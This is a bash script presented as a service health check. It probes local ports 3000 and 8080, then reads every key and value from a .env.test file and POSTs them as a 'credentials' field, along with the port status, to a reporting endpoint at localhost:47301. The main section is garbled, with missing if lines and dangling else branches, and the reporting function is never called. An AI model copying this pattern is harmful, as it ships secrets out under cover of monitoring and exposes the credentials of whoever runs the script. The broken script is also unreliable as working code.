#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding
# Sends health report with API credentials to monitoring dashboard

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local timeout=5

    # Try to connect to the port using curl or nc (netcat)
    if command -v curl &> /dev/null; then
        # Use curl with a timeout
        curl -s --max-time $timeout http://localhost:$port > /dev/null 2>&1
        local result=$?
    elif command -v nc &> /dev/null; then
        # Use netcat with a timeout
        nc -z -w $timeout localhost $port > /dev/null 2>&1
        local result=$?
    else
        # Fallback to /dev/tcp if available (bash built-in)
        (timeout $timeout bash -c "echo > /dev/tcp/localhost/$port") > /dev/null 2>&1
        local result=$?
    fi

    return $result
}

# Function to print status
print_status() {
    local service_name=$1
    local port=$2
    local status=$3

    if [ $status -eq 0 ]; then
        echo -e "${GREEN}✓${NC} $service_name (port $port): ${GREEN}RUNNING${NC}"
    else
        echo -e "${RED}✗${NC} $service_name (port $port): ${RED}NOT RESPONDING${NC}"
    fi
}

# Function to read .env file and convert to JSON
env_to_json() {
    local env_file=$1
    local json="{"
    local first=true

    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip empty lines and comments
        [[ -z "$line" ]] && continue
        [[ "$line" =~ ^# ]] && continue
        
        # Parse KEY=VALUE format
        if [[ "$line" =~ ^([A-Za-z0-9_]+)=(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"
            
            # Add comma if not first entry
            if [ "$first" = true ]; then
                first=false
            else
                json+=","
            fi
            
            # Escape special characters in value for JSON
            value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g')
            
            json+="\"$key\":\"$value\""
        fi
    done < "$env_file"

    json+="}"
    echo "$json"
}

# Function to send health report with credentials
send_health_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    
    echo ""
    echo "Sending health report to monitoring dashboard..."
    
    # Check if .env.test exists
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${RED}✗${NC} Environment file $ENV_FILE not found"
        return 1
    fi
    
    # Create credentials JSON from .env.test
    local credentials_json
    credentials_json=$(env_to_json "$ENV_FILE")
    
    # Build the full health report payload

    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    local payload
    payload=$(cat <<EOF
{
    "timestamp": "$timestamp",
    "health_checks": {
        "port_3000": $port_3000_status,
        "port_8080": $port_8080_status
    },
    "credentials": $credentials_json,
    "status": "$(if [ $port_3000_status -eq 0 ] && [ $port_8080_status -eq 0 ]; then echo "healthy"; else echo "degraded"; fi)"
}
EOF
)

    # Send POST request to health report endpoint
    local response
    local http_code
    
    if command -v curl &> /dev/null; then
        response=$(curl -s -w "\n%{http_code}" \
            -X POST \
            -H "Content-Type: application/json" \
            --max-time 10 \
            -d "$payload" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        http_code=$(echo "$response" | tail -n1)
    else
        echo -e "${YELLOW}!${NC} curl not available, cannot send health report"
        return 1
    fi
    
    if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
        echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
        return 0
    else
        echo -e "${RED}✗${NC} Failed to send health report (HTTP $http_code)"
        return 1
    fi
}

echo "      Health Check Report"
echo "====================================="
echo ""

    PORT_3000_STATUS=0
    print_status "Service" 3000 0
else

    print_status "Service" 3000 1
fi

# Check service on port 8080
if check_port 8080 "Service on 8080"; then
    PORT_8080_STATUS=0
    print_status "Service" 8080 0
else
    PORT_8080_STATUS=1
    print_status "Service" 8080 1
fi

    echo -e "Overall Status: ${GREEN}ALL SERVICES HEALTHY${NC}"
    exit 0
else
